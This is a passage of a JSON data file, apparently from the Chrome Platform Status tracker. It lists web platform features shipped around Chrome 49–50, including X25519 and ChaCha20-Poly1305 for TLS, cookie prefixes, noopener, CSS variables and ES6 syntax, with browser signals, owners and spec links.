        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "ios": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=497234",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Automations for the BiquadFilter node will run at a-rate (updated every frame) instead of the current k-rate (updated every rendering quantum of 128 frames) ",
    "id": 5754107776204800,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#the-biquadfilternode-interface"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:52.516800",
      "by": "ericbidelman@google.com"
    },
    "name": "X25519 for TLS",
    "tags": [
      "tls",
      "ssl",
      "curve25519",
      "x25519"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-tls-curve25519-01",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "davidben@chromium.org",
          "agl@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/579716",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "url": "https://www.ietf.org/mail-archive/web/tls/current/msg19084.html",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Curve25519, designed by Prof. Dan Bernstein, is one of the two curves selected by the CFRG for recommendation. When compared to P-256, the most commonly used curve in TLS today, it admits simpler, faster implementations that are more naturally resistant to side-channels.\r\n\r\nIn Chrome 50, we will be adding support for X25519, the Diffie-Hellman primitive over curve25519, to TLS.",
    "id": 5682529109540864,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:34.981970",
      "by": "ericbidelman@google.com"
    },
    "name": "XMLHttpRequestProgressEvent (position and totalSize)",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=845631",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/357112",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The XMLHttpRequestProgressEvent interface will be removed, together with the attributes position and totalSize. Instead the ProgressEvent interface will be used, and the attributes loaded and total should be used instead.",
    "id": 5044837464145920,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:47.354630",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "'noopener' link relation",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/#link-type-noopener",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1222516",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://crbug.com/551884",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/webappsec-secure-contexts/issues/6#issuecomment-155506934",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The 'noreferrer' link relation currently governs both referrer policy for a navigation, as well as the 'opener' attribute of any newly created browsing context. The 'noopener' link relation gives devlopers the ability to control the latter without opting into the former.",
    "id": 5651874132787200,
    "resources": {
      "docs": [
        "https://html.spec.whatwg.org/#following-hyperlinks",
        "https://html.spec.whatwg.org/#dom-open"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:28.303810",
      "by": "ericbidelman@google.com"
    },
    "name": "Audio Output Devices API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/mediacapture-output",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "guidou@chromium.org",
          "tommi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "bug": "https://crbug.com/547091",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature will incorporate a set of JavaScript APIs that let a Web application direct the audio output of a media element to authorized devices other than the system or user agent default.",
    "id": 4621603249848320,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement"
      ],
      "samples": [
        "https://webrtc.github.io/samples/src/content/devices/multi/"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:26:17.746480",
      "by": "ericbidelman@google.com"
    },
    "name": "Background Sync API",
    "comments": "Web developer views: Positive because we had multiple confirmations that the use cases this API intend to address are important to developers working on high profile web properties.\r\n\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/BackgroundSync/spec/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/forum/#!msg/mozilla.dev.platform/cTAnBeZFtUE/kx0I4UC-AQAJ",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "jkarlin@chromium.org",
          "owencm@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>BackgroundSync"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=449443",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An API that extends Service Workers with an onsync event.",
    "id": 6170807885627392,
    "resources": {
      "docs": [
        "https://github.com/WICG/BackgroundSync/blob/master/explainer.md",
        "https://github.com/WICG/BackgroundSync"
      ],
      "samples": [
        "https://wicg.github.io/BackgroundSync/demo/"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:39.739140",
      "by": "ericbidelman@google.com"
    },
    "name": "CHACHA20_POLY1305 cipher suites for TLS",
    "tags": [
      "tls",
      "ssl",
      "chacha20",
      "poly1305"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-tls-chacha20-poly1305-04",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=917571",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "davidben@chromium.org",
          "agl@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "webview": 49,
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chrome 31 deployed a new TLS cipher suite based on Prof. Dan Bernstein's ChaCha20 and Poly1305 algorithms. They run three times faster than AES-GCM on devices that don't have AES hardware acceleration, including most Android phones.\r\n\r\nThese have now made their way through the standardization process. We'll be deploying the standardized variant in Chrome 49.",
    "id": 5355238106071040,
    "resources": {
      "docs": [
        "https://googleonlinesecurity.blogspot.com/2014/04/speeding-up-and-strengthening-https.html"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:17.040090",
      "by": "ericbidelman@google.com"
    },
    "name": "CSP: Insecure source expressions match secure URLs.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://w3c.github.io/webappsec-csp/#changes-from-level-2",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://crbug.com/558232",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In the wake of Sniffly, it seems pretty reasonable to prevent folks from locking themselves into insecurity. To that end, Insecure schemes in source expressions now match their secure variants. That is, `http:` is equivalent to `http: https:`, and `http://a.com` to `http://a.com https://a.com`.",
    "id": 6653486812889088,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-26 08:32:23.211710",
      "by": "Patket@microsoft.com"
    },
    "name": "CSS Custom Properties (CSS Variables)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.w3.org/TR/css-variables-1/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=773296",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "shans@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "http://crbug.com/465126",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/cssvariables",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#specification-css-variables",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Introduces cascading variables as a new primitive value type that is accepted by all CSS properties, and custom properties for defining them.",
    "id": 6401356696911872,
    "resources": {
      "samples": [
        "https://googlechrome.github.io/samples/css-custom-properties/index.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:43.073340",
      "by": "ericbidelman@google.com"
    },
    "name": "Case-insensitive Attribute Selector Matching",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/selectors-4/#attribute-case",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=888190",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "fs@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=567732",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "An additional modifier ('i') for attribute selectors, that allows an author to match an attribute (ASCII) case-insensitively.",
    "id": 5610936115134464,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors"
      ],
      "samples": [
        "http://css4-selectors.com/selector/css4/attribute-case-sensitivity/",
        "https://googlechrome.github.io/samples/css-attribute-case-sensitivity/index.html"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:33.731820",
      "by": "ericbidelman@google.com"
    },
    "name": "Cookie Prefixes",
    "tags": [
      "cookies"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tools.ietf.org/html/draft-west-cookie-prefixes",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1283368",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "estark@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://crbug.com/567867",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "url": "https://github.com/MicrosoftEdge/Status/issues/448",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "This feature adds a set of restrictions upon the names which may be used for cookies with specific properties. These restrictions enable user agents to smuggle cookie state to the server within the confines of the existing \"Cookie\" request header syntax, and limits the ways in which cookies may be abused.\r\n\r\nIn a nutshell: `__Secure-*` cookies have to have the `Secure` flag, and `__Host-*` cookies have to have `Path=/`, can't have `Domain`, and might require `Secure` (depending on the setter).",
    "id": 4952188392570880,
    "resources": {
      "samples": [
        "https://googlechrome.github.io/samples/cookie-prefixes/index.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-26 08:32:04.415790",
      "by": "Patket@microsoft.com"
    },
    "name": "Default parameters (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-functions-and-classes",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/15#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2160",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/defaultparameter",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-default-parameter-values",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows formal parameters to be initialized with default values if no value (or 'undefined') is passed.",
    "id": 5275456790069248,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Default_parameters"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/default-parameters-es6/index.html"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:51.689210",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate & Remove webkitMovementX/Y",
    "comments": "Originally announced:\r\nIntent to Deprecate and Remove: Prefixed Pointer Lock\r\nhttps://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/tN8fWRtG0MI",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://w3c.github.io/pointerlock/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 49
        },
        "owners": [
          "scheib@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=398457",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove prefixed version of MouseEvent.webkitMovementX/Y leaving Pointer Lock specification version: MouseEvent.movementX/Y.",
    "id": 5676647286046720,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-26 08:31:33.108270",
      "by": "Patket@microsoft.com"
    },
    "name": "Destructuring (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-destructuring-assignment",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "adamk@chromium.org",
          "rossberg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/v8/issues/detail?id=811",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/destructuring",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-destructuring-syntax",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Destructuring assignment allows extracting data from arrays or objects using a syntax that mirrors array and object literals.\r\n\r\n",
    "id": 4588790303686656,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/destructuring-es6/index.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:05.565760",
      "by": "ericbidelman@google.com"
    },
    "name": "Fetch API: New value \"navigate\" for Request.mode",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://fetch.spec.whatwg.org/#concept-request-mode",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "shiva.jm@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=537138",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Introduce a new value \"navigate\" for Request.mode of the Fetch API.\r\n\r\n\"navigate\" mode is intended to be used only for navigation.",
    "id": 5768993059110912,
    "resources": {
      "samples": [
        "https://googlechrome.github.io/samples/service-worker/custom-offline-page/"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:58.281250",
      "by": "ericbidelman@google.com"
    },
    "name": "FetchEvent.clientId attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/45",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "jungkee.song@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=552309",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A read-only attribute that indicates the id of the Client object that initiated this fetch request. For a navigation request and worker (dedicated worker and shared worker) script fetch, this attribute returns null.",
    "id": 5717034876796928,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/FetchEvent/clientId"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:33.572550",
      "by": "ericbidelman@google.com"
    },
    "name": "HTMLMediaElement.disableRemotePlayback",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/remote-playback/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://www.w3.org/2015/10/29-webscreens-minutes.html#item01",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "avayvod@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://crbug.com/542684",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This attribute allows websites to tell the UA that they do not wish for a media element to be played remotely. The UA will prevent the element from being played remotely and will not show any UI advertising remote playback.",
    "id": 4938279812071424,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:58.671640",
      "by": "ericbidelman@google.com"
    },
    "name": "HTTP Client Hints: Save-Data",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://httpwg.org/http-extensions/client-hints.html#the-save-data-hint",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 49,
        "ios": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=485640",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The “Save-Data” header field is a boolean that, in requests, indicates client’s explicit opt-in for reduced data usage, due to high transfer costs, slow connection speeds, or other reasons. When communicated to origins, it allows them to deliver alternate content honoring such preference - e.g. smaller image and video resources, alternate \"light mode\" markup, etc.",
    "id": 5720139752275968,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/02/save-data?hl=en"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-07-17 15:06:48.349990",
      "by": "majidvp@chromium.org"
    },
    "name": "High Resolution Time Stamp for Events",
    "tags": [
      "high resolution",
      "timeStamp",
      "event",
      "input"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-event-timestamp",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1026804",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 49
        },
        "owners": [
          "majidvp@chromium.org",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 49,
        "blink_components": [
          "Blink"
        ],
        "desktop": 49,
        "flag": false,
        "android": 49,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=160524",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/whatwg/dom/issues/23#issuecomment-249319401",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
